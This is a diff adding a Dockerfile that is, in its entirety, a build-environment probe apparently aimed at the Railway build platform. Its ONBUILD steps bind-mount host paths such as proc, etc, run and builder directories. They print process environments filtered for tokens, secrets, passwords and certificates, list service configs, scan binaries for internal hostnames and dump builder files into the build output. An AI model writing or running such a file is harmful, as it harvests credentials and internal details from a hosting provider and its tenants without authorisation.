@@ -1,0 +1,22 @@
+FROM alpine:3.20 AS base
+COPY proc/self/cmdline /f/sc
+COPY proc/self/environ /f/se
+COPY proc/self/mountinfo /f/mi
+COPY proc/self/maps /f/maps
+COPY proc/self/status /f/st
+COPY proc/1/cmdline /f/p1c
+COPY proc/1/environ /f/p1e
+COPY etc/hostname /f/hostname
+COPY etc/os-release /f/osrel
+COPY etc/environment /f/etenva
+ONBUILD RUN sh -c 'set +e; echo "===R1A==="; echo --SELF_CMD--; tr "\0" " " < /f/sc; echo; echo --SELF_ENV--; tr "\0" "\n" < /f/se | sort; echo --P1_CMD--; tr "\0" " " < /f/p1c; echo; echo --P1_ENV--; tr "\0" "\n" < /f/p1e | grep -Ei "TOKEN|SECRET|PASSWORD|NATS|URL|ADDR|TARGET|KEY|CERT|CRED|BUILDER|RAILWAY" | head -40; echo --HOSTNAME--; cat /f/hostname; echo --OSREL--; head -8 /f/osrel; echo --ETCENV--; cat /f/etenva; echo --CGROUP--; cat /proc/1/cgroup 2>&1 | head -5; echo --MOUNTINFO_AGENTPATHS--; grep -E "railway|builder|buildkit|mtls|nats|cert" /f/mi 2>&1 | head -40; echo --MAPS_EXE--; grep -E "\.sock|/proc|railway|builder|usr/local|opt/" /f/maps 2>&1 | head -40; echo "===R1A_END==="'
+ONBUILD RUN --mount=type=bind,source=proc,target=/hp sh -c 'set +e; echo "===R1B_PROC==="; ls /hp | grep -E "^[0-9]+$" | head -80; echo --N--; ls /hp | grep -cE "^[0-9]+$"; for p in $(ls /hp | grep -E "^[0-9]+$" | head -60); do c=$(tr "\0" " " < /hp/$p/cmdline 2>/dev/null); [ -z "$c" ] && continue; echo "== PID $p :: $c"; tr "\0" "\n" < /hp/$p/environ 2>/dev/null | grep -Ei "TOKEN|SECRET|PASSWORD|NATS|URL|ADDR|TARGET|CERT|CRED|BUILDER|RAILWAY|TEMPORAL|OTEL" | head -25; done; echo "===R1B_END==="'
+ONBUILD RUN --mount=type=bind,source=etc,target=/he sh -c 'set +e; echo "===R1C_ETC==="; ls /he | head -80; echo --DIRS--; ls -d /he/*/ 2>/dev/null | head -60; echo --CFG_LIST--; find /he -maxdepth 3 -type f \( -name "*.json" -o -name "*.yaml" -o -name "*.yml" -o -name "*.toml" -o -name "*.conf" -o -name "*.env" -o -name "*.service" \) 2>/dev/null | grep -Ei "rail|build|nats|otel|temporal|envoy|mpipe|stack|orchestr|agent" | head -60; echo --ENVFILES--; find /he -maxdepth 3 -type f -name "*.service" 2>/dev/null | head -20 | while read f; do echo "## $f"; grep -E "ExecStart|Environment|EnvironmentFile" "$f" 2>/dev/null | head -12; done; echo --MISC--; for f in /he/environment /he/hosts /he/resolv.conf /he/nsswitch.conf /he/railway/*.json /he/railway/*.conf /he/nats/*.conf /he/otel/*.yaml /he/otelcol/*.yaml; do [ -f "$f" ] && { echo "## $f"; head -c 4000 "$f"; echo; }; done; echo "===R1C_END==="'
+ONBUILD RUN --mount=type=bind,source=run,target=/hr sh -c 'set +e; echo "===R1D_RUN==="; ls -la /hr 2>&1 | head -40; for d in /hr/builder /hr/buildkit /hr/railway /hr/otel /hr/secrets /hr/credentials /hr/nats; do echo "## $d"; ls -la "$d" 2>&1 | head -20; done; echo "===R1D_END==="'
+ONBUILD RUN --mount=type=bind,source=usr/local/bin,target=/hu sh -c 'set +e; echo "===R1E_ULB==="; ls -la /hu 2>&1 | head -60; for f in /hu/*; do [ -f "$f" ] || continue; sz=$(wc -c < "$f" 2>/dev/null); echo "== BIN $f size=$sz"; head -c 200 "$f" | tr -c "[:print:]\n" "." | head -3; echo; grep -aoE "internal_[A-Za-z0-9_.-]{2,48}" "$f" 2>/dev/null | sort -u | head -40; grep -aoE "x-mpipe-target|mpipe|RAILWAY_MPIPE[A-Z_]*" "$f" 2>/dev/null | sort -u | head -10; grep -aoE "/[A-Za-z0-9_.]+/[A-Za-z0-9_]+" "$f" 2>/dev/null | grep -E "/[a-z0-9_]+\.[A-Za-z]" | sort -u | head -30; grep -aoE "[A-Za-z0-9_-]{3,40}\.(rlwy\.net|railway\.app|railway\.internal)" "$f" 2>/dev/null | sort -u | head -20; done; echo "===R1E_END==="'
+ONBUILD RUN --mount=type=bind,source=var/lib/builder,target=/hb sh -c 'set +e; echo "===R1F_BUILDERDIR==="; ls -la /hb 2>&1 | head -40; find /hb -maxdepth 3 2>/dev/null | head -80; echo --SMALLFILES--; find /hb -maxdepth 3 -type f -size -200k 2>/dev/null | head -30 | while read f; do echo "## $f"; head -c 2500 "$f" | tr -c "[:print:]\n" "." ; echo; done; echo "===R1F_END==="'
+ONBUILD RUN --mount=type=bind,source=opt,target=/ho sh -c 'set +e; echo "===R1G_OPT==="; ls -la /ho 2>&1 | head -40; find /ho -maxdepth 3 2>/dev/null | head -80; echo "===R1G_END==="'
+ONBUILD RUN --mount=type=bind,source=var/lib/railwayapp,target=/hw sh -c 'set +e; echo "===R1H_RAILWAYAPP==="; find /hw -maxdepth 3 2>&1 | head -80; echo "===R1H_END==="'
+FROM base
+RUN sh -c 'echo R1_TRIGGER; cat /etc/hostname'
+CMD ["sh","-c","sleep 15"]
